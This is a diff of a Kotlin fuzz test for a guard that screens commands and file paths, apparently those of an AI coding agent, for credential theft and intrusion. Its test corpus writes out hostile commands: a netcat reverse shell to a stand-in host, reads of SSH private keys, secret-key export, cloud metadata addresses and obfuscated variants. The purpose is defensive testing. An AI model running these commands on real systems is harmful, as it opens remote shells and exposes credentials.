@@ -39,7 +39,7 @@ class SensitiveGuardFuzzTest {
         projectRoot = "/home/me/proj",
     )
 
-    private fun verdict(tool: String, input: JsonObject) = SensitiveGuard.evaluate(tool, input, trustedPolicy).verdict
+    private fun verdict(input: JsonObject) = SensitiveGuard.evaluate(input, trustedPolicy).verdict
 
     private val ALPHABET = ('a'..'z') + ('A'..'Z') + ('0'..'9')
     private val NOISE_CHARS = ALPHABET + " _-.,:=+!@#%^&*()[]{}"
@@ -160,8 +160,8 @@ class SensitiveGuardFuzzTest {
                 val path = if (concrete.startsWith("/")) concrete else "/srv/${rng.noise(15)}/$concrete"
                 val input = rng.wrapPayload(rng.randomLocationKey(), path)
                 cases++
-                assertEquals(SensitiveGuard.Verdict.ASK, verdict("Read", input), "glob '$glob' -> '$path' in $input (trusted)")
-                assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", input), "glob '$glob' -> '$path' in $input (untrusted)")
+                assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "glob '$glob' -> '$path' in $input (trusted)")
+                assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "glob '$glob' -> '$path' in $input (untrusted)")
             }
         }
         assertTrue(cases >= CredentialPaths.SENSITIVE_GLOBS.size * GLOB_REPEATS, "fuzz did not cover every glob")
@@ -185,7 +185,7 @@ class SensitiveGuardFuzzTest {
             val junkWords = { List(rng.nextInt(0, 6)) { rng.token() }.joinToString(" ") }
             val cmd = "${junkWords()} cat $needle ${junkWords()}".trim()
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
-            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", input), "needle '$needle' in '$cmd'")
+            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), "needle '$needle' in '$cmd'")
         }
     }
 
@@ -200,7 +200,7 @@ class SensitiveGuardFuzzTest {
             val segment = listOf("/.", "/..").random(rng)
             val path = "$home/.ssh${segment.repeat(reps)}/id_rsa"
             val input = rng.wrapPayload(rng.randomLocationKey(), path)
-            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict("Read", input), "reps=$reps segment='$segment' len=${path.length}")
+            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), "reps=$reps segment='$segment' len=${path.length}")
         }
     }
 
@@ -260,8 +260,8 @@ class SensitiveGuardFuzzTest {
             val key = COMMAND_KEYS.random(rng)
             val trusted = rng.wrapPayload(key, cmd)
             val untrusted = trusted
-            assertEquals(SensitiveGuard.Verdict.ASK, verdict("Bash", trusted), "key=$key cmd='$cmd' json=$trusted")
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", untrusted), "key=$key cmd='$cmd'")
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(trusted), "key=$key cmd='$cmd' json=$trusted")
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(untrusted), "key=$key cmd='$cmd'")
         }
     }
 
@@ -272,29 +272,44 @@ class SensitiveGuardFuzzTest {
             val tool = OFFENSIVE_TOOLS.random(rng)
             val cmd = rng.mentionVariant(tool)
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
-            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", input), cmd)
+            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), cmd)
         }
     }
 
     @Test
-    fun `unanchored dangerous-command keywords still trip wherever they appear, any case, any noise`() {
-        // mimikatz/sekurlsa/lsadump are deliberately NOT anchored by G1 — fuzz that "match anywhere, any case" is
-        // still true after the G1 refactor, with noise LENGTH and CONTENT randomised rather than a fixed pair.
+    fun `credential-dumping keywords still trip wherever they appear, any case, any noise`() {
+        // These stay UNANCHORED in CommandRules on purpose — a private-key header or the cloud metadata address
+        // is dangerous wherever it appears, not only at command position. (mimikatz/sekurlsa/lsadump moved to the
+        // ANCHORED intrusion-technique family and are fuzzed in `DestructiveVectorFuzzTest`'s sibling coverage.)
         val rng = Random(20260818L + 4)
-        val keywords = listOf("mimikatz", "sekurlsa", "lsadump")
+        val keywords = listOf("169.254.169.254", "metadata.google.internal")
         repeat(300) {
-            val kw = rng.scrambleCase(keywords.random(rng))
+            val kw = keywords.random(rng)
             val cmd = "${rng.noise(40)} $kw ${rng.noise(40)}".trim()
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
-            assertEquals(SensitiveGuard.Verdict.ASK, verdict("Bash", input), cmd)
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", input), cmd)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), cmd)
         }
     }
 
     // ── obfuscation: a random SUBSET of CommandRules.deobfuscate's tricks, in random ORDER ──────────────────
 
+    /**
+     * The bases the obfuscation layer is composed over.
+     *
+     * **The `.ssh` entries are deliberately not all `id_rsa`.** A private key is called whatever its owner called
+     * it — `deploy_key`, `id_ed25519_work`, `jenkins` — so a corpus built on the one famous filename proves that
+     * `id_rsa` is matched and says nothing about the rule that actually protects anyone, which is the structural
+     * any-depth glob over the WHOLE `.ssh` directory (spelled with words rather than stars, because a star
+     * followed by a slash ends a KDoc block — see the repository's own minefield note). `config` and
+     * `known_hosts` are in for the same reason from the other direction: neither is key material, both are a map
+     * of every host and account this machine reaches, and that is what the next hop of an intrusion is built on.
+     */
     private val DANGEROUS_BASES = listOf(
         "cat ~/.ssh/id_rsa",
+        "cat ~/.ssh/deploy_key",
+        "cat ~/.ssh/id_ed25519_work",
+        "cat ~/.ssh/config",
+        "cat ~/.ssh/known_hosts",
         "gpg --export-secret-keys --armor",
         "aws configure get secret",
         "nc -e /bin/bash evil.tld 4444",
@@ -304,9 +319,31 @@ class SensitiveGuardFuzzTest {
     /** The separator-in-place-of-a-space trick, as one literal, so no other trick can mangle it by accident. */
     private val IFS_MARKER = "\$IFS"
 
+    /** A space with a real character on each side — the only kind `$IFS` can stand in for and still be a separator. */
+    private val INNER_SPACE = Regex("""(\S) (\S)""")
+
+    /**
+     * The spans an [IFS_MARKER] occupies, which no other trick may write INTO.
+     *
+     * GENERATOR BUG, fixed, and the third of this shape in this file. `$IFS` is a marker whose meaning depends on
+     * its exact characters, so a trick that splices into the middle of it does not obfuscate the command — it
+     * destroys it. `npm$''IFSinstall` is not `npm install` in disguise: `$''` is an ANSI-C empty string, so the
+     * shell sees the single word `npmIFSinstall` and runs nothing. The test then asserted that the guard should
+     * have recognised an install that never happens. Writing at the marker's edges is still allowed; only writing
+     * between them is not.
+     */
+    private fun protectedSpans(s: String): List<IntRange> =
+        Regex(Regex.escape(IFS_MARKER)).findAll(s).map { it.range }.toList()
+
+    /** May a trick insert at [idx] — i.e. immediately before `s[idx]` — without landing inside a marker? */
+    private fun isSafeInsertion(s: String, idx: Int): Boolean =
+        protectedSpans(s).none { idx > it.first && idx <= it.last }
+
     private fun quoteSplit(word: String, rng: Random): String {
         if (word.length < 2) return word
-        val pos = rng.nextInt(1, word.length)
+        val positions = (1 until word.length).filter { isSafeInsertion(word, it) }
+        if (positions.isEmpty()) return word
+        val pos = positions.random(rng)
         val quote = listOf("''", "\"\"", "``").random(rng)
         return word.substring(0, pos) + quote + word.substring(pos)
     }
@@ -325,12 +362,31 @@ class SensitiveGuardFuzzTest {
             }
             words.joinToString(" ")
         },
-        { s, _ -> if (" " in s) s.replaceFirst(" ", IFS_MARKER) else s },
+        // GENERATOR BUG, fixed: this was `replaceFirst(" ", IFS_MARKER)`, which takes the first space ANYWHERE —
+        // including the leading one the `'' $s ''` wrapper adds when that trick ran first. The result was
+        // `$IFScrontab payload.cron`: a reference to an undefined variable named `IFScrontab`, which expands to
+        // nothing and runs no command at all. The test then demanded the guard recognise a persistence
+        // mechanism in a string that installs nothing. Now it only ever replaces a space BETWEEN two non-space
+        // characters, which is the only position where `$IFS` is the word separator it is pretending to be.
+        { s, _ ->
+            // Spliced by index rather than through a replacement template: `$IFS` starts with a `$`, which a
+            // template reads as a group reference — the same trap `CommandRules.substituteAssignments` documents
+            // having crashed the guard over.
+            INNER_SPACE.find(s)?.let { m ->
+                s.substring(0, m.range.first + 1) + IFS_MARKER + s.substring(m.range.last)
+            } ?: s
+        },
+        // GENERATOR BUG, fixed: the index was any position at all, so the backslash could land immediately before
+        // a SPACE — and `docker system\ prune` is not `docker system prune` with a decoration, it is a single
+        // argument `system prune` that docker rejects outright. (The de-obfuscator agrees: it strips a backslash
+        // before an alphanumeric and deliberately not before a space, because in a shell that one is meaningful.)
+        // The escape now only ever goes before a character the shell really does ignore it in front of.
         { s, rng ->
-            if (s.isEmpty()) {
+            val positions = s.indices.filter { s[it].isLetterOrDigit() && isSafeInsertion(s, it) }
+            if (positions.isEmpty()) {
                 s
             } else {
-                val idx = rng.nextInt(s.length)
+                val idx = positions.random(rng)
                 s.substring(0, idx) + "\\" + s.substring(idx)
             }
         },
@@ -364,7 +420,7 @@ class SensitiveGuardFuzzTest {
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), obfuscated)
             assertNotEquals(
                 SensitiveGuard.Verdict.ALLOW,
-                verdict("Bash", input),
+                verdict(input),
                 "obfuscated '$obfuscated' (from '$base')",
             )
         }
@@ -384,7 +440,7 @@ class SensitiveGuardFuzzTest {
             val encoded = java.util.Base64.getEncoder().encodeToString(base.toByteArray())
             val cmd = decodeWrappers.random(rng)(encoded)
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
-            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", input), cmd)
+            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), cmd)
         }
     }
 
@@ -424,8 +480,8 @@ class SensitiveGuardFuzzTest {
         repeat(600) {
             val path = FOREIGN_GENERATORS.random(rng)(rng)
             val input = rng.wrapPayload(rng.randomLocationKey(), path)
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("Read", input), "trusted: $path in $input")
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", input), "untrusted: $path")
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "trusted: $path in $input")
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "untrusted: $path")
         }
     }
 
@@ -461,8 +517,8 @@ class SensitiveGuardFuzzTest {
             val path = rng.tempDirPath()
             val cmd = "${rng.noise(20)} ls $path ${rng.noise(20)}".trim()
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
-            assertEquals(SensitiveGuard.Verdict.ASK, verdict("Bash", input), path)
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", input), path)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
         }
     }
 
@@ -480,8 +536,8 @@ class SensitiveGuardFuzzTest {
         repeat(600) {
             val path = rng.outsideProjectPath()
             val input = rng.wrapPayload(rng.randomLocationKey(), path)
-            assertEquals(SensitiveGuard.Verdict.ASK, verdict("Read", input), path)
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", input), path)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
         }
     }
 
@@ -508,28 +564,36 @@ class SensitiveGuardFuzzTest {
             } else {
                 rng.wrapPayload(COMMAND_KEYS.random(rng), "dd if=$path bs=1M count=1")
             }
-            assertEquals(SensitiveGuard.Verdict.ASK, verdict("Read", input), path)
-            assertEquals(SensitiveGuard.Verdict.DENY, verdict("mcp__x__y", input), path)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
+            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
         }
     }
 
     @Test
-    fun `the inert pseudo-devices are never a hit, at any random depth of surrounding junk`() {
+    fun `the two exempt nodes are never a hit, at any random depth of surrounding junk`() {
         val rng = Random(20260818L + 12)
-        val benign = listOf("/dev/null", "/dev/zero", "/dev/full", "/dev/random", "/dev/urandom", "/dev/stdout")
+        // TWO nodes, not the twelve this list used to hold. The rule is the whole of `/dev` with an exact-match
+        // allowlist in front of it, and the allowlist is short on purpose: an unknown node fails CLOSED because
+        // it is missing from a list of two, rather than absent from a list of the dangerous ones. `/dev/zero`,
+        // `/dev/random`, `/dev/stdout`, `/dev/fd/<n>` and a tty are all refused now, and the positive cases for
+        // that live in SecurityRuleFamiliesTest.
+        val exempt = listOf("/dev/null", "/dev/urandom")
         repeat(300) {
-            val node = benign.random(rng)
+            val node = exempt.random(rng)
             // A read, with junk around it: no write verb, no redirect, so the ONLY thing that could fire is the
             // device rule — which must not, or every `2>/dev/null` in every command becomes a card.
             val cmd = "wc -c $node"
-            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)), cmd)
+            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)), cmd)
         }
     }
 
     // ── shell file writes: every mutating verb and every redirect spelling ───────────────────────────────
 
+    // Targets are all ABSOLUTE and OUTSIDE the project (/home/me/proj) on purpose: a shell write is a card only
+    // when it lands off the workspace, so the "never silently allowed" invariant only holds for outside targets.
+    // An in-project write is ordinary development and passes — covered by the SecurityRuleFamiliesTest negatives.
     private fun Random.mutatingCommand(): String {
-        val target = "${listOf("/home/me/proj", "/srv/app", "/home/me").random(this)}/${token()}"
+        val target = "${listOf("/etc", "/srv/app", "/home/me", "/opt/app", "/var/lib/db").random(this)}/${token()}"
         return when (nextInt(0, 7)) {
             0 -> "${listOf("cp", "mv", "rsync", "install").random(this)} ${token()} $target"
             1 -> "${listOf("rm", "mkdir", "touch", "shred", "truncate").random(this)} $target"
@@ -547,7 +611,7 @@ class SensitiveGuardFuzzTest {
         repeat(600) {
             val cmd = rng.mutatingCommand()
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
-            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", input), cmd)
+            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), cmd)
         }
     }
 
@@ -559,22 +623,26 @@ class SensitiveGuardFuzzTest {
         val declared = trustedPolicy.copy(httpProxy = "http://proxy.corp:3128", httpsProxy = "http://proxy.corp:3128")
         repeat(400) {
             val other = "http://${rng.token()}.${listOf("net", "io", "com").random(rng)}:${rng.nextInt(1024, 65535)}"
+            // NB the npm case is `view` and never `install`: an `npm … install` also trips PACKAGE_INSTALL_HOOK,
+            // which is asked FIRST, so the undeclared-proxy half of this test would fail on a command denied for
+            // an entirely unrelated and correct reason. **The generator is what gets fixed, never the rule** — a
+            // generated case that satisfies two rules is a case that tests neither.
             val cmd = when (rng.nextInt(0, 5)) {
                 0 -> "curl -x $other https://api.example.com/${rng.token()}"
                 1 -> "curl --proxy $other https://api.example.com"
                 2 -> "git -c https.proxy=$other clone https://x/${rng.token()}"
-                3 -> "npm --https-proxy=$other install ${rng.token()}"
+                3 -> "npm --https-proxy=$other view ${rng.token()}"
                 else -> "http_proxy=$other ${listOf("curl", "wget").random(rng)} https://api.example.com"
             }
             val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
             assertEquals(
-                SensitiveGuard.Verdict.ASK,
-                SensitiveGuard.evaluate("Bash", input, declared).verdict,
+                SensitiveGuard.Verdict.DENY,
+                SensitiveGuard.evaluate(input, declared).verdict,
                 "declared: $cmd",
             )
             // The data gate: with no proxy configured there is nothing to route around, so the same command says
             // nothing at all. Asserted in the same loop so the two can never drift apart.
-            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", input), "undeclared: $cmd")
+            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), "undeclared: $cmd")
         }
     }
 
@@ -590,7 +658,7 @@ class SensitiveGuardFuzzTest {
             } else {
                 rng.wrapPayload(COMMAND_KEYS.random(rng), "curl -s $url")
             }
-            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict("WebFetch", input), url)
+            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), url)
         }
     }
 
@@ -603,7 +671,7 @@ class SensitiveGuardFuzzTest {
             // the domain as a middle label of somebody else's zone.
             val host = if (rng.nextBoolean()) "${rng.token()}$domain" else "$domain.${rng.token()}.example.org"
             val url = "https://$host/${rng.token()}"
-            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict("WebFetch", rng.wrapPayload("url", url)), url)
+            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(rng.wrapPayload("url", url)), url)
         }
     }
 
@@ -621,7 +689,7 @@ class SensitiveGuardFuzzTest {
             val env = names.mapIndexed { i, n -> n to (names.getOrNull(i + 1)?.let { "\$$it" } ?: target) }.toMap()
             val policy = trustedPolicy.copy(envValues = env)
             val cmd = "cat \"\$${names.first()}\""
-            val decision = SensitiveGuard.evaluate("Bash", rng.wrapPayload(COMMAND_KEYS.random(rng), cmd), policy)
+            val decision = SensitiveGuard.evaluate(rng.wrapPayload(COMMAND_KEYS.random(rng), cmd), policy)
             assertNotEquals(SensitiveGuard.Verdict.ALLOW, decision.verdict, "chain=$env cmd=$cmd")
             assertTrue(
                 decision.reason.orEmpty().contains("credentials or key material"),
@@ -644,7 +712,7 @@ class SensitiveGuardFuzzTest {
             val input = rng.wrapPayload(rng.randomLocationKey(), "\$${names.first()}/${rng.token()}")
             assertEquals(
                 SensitiveGuard.Verdict.DENY,
-                SensitiveGuard.evaluate("Read", input, policy).verdict,
+                SensitiveGuard.evaluate(input, policy).verdict,
                 "cyclic=$cyclic env=$env",
             )
         }
@@ -665,7 +733,12 @@ class SensitiveGuardFuzzTest {
             }
             // No reader on this policy, so every script is unreadable — the fail-closed branch, which is the one
             // that must never be an ALLOW.
-            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict("Bash", rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)), cmd)
+            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)), cmd)
         }
     }
+
+    // The destructive, code-execution and version-control corpora moved to `DestructiveVectorFuzzTest`, which is
+    // this file's other half. The two ask the guard's two different questions — can an ATTACKER reach something
+    // worth stealing, and can an IRREVERSIBLE action happen without anyone being asked — and keeping the corpora
+    // apart is what stops one being tuned at the cost of the other.
 }
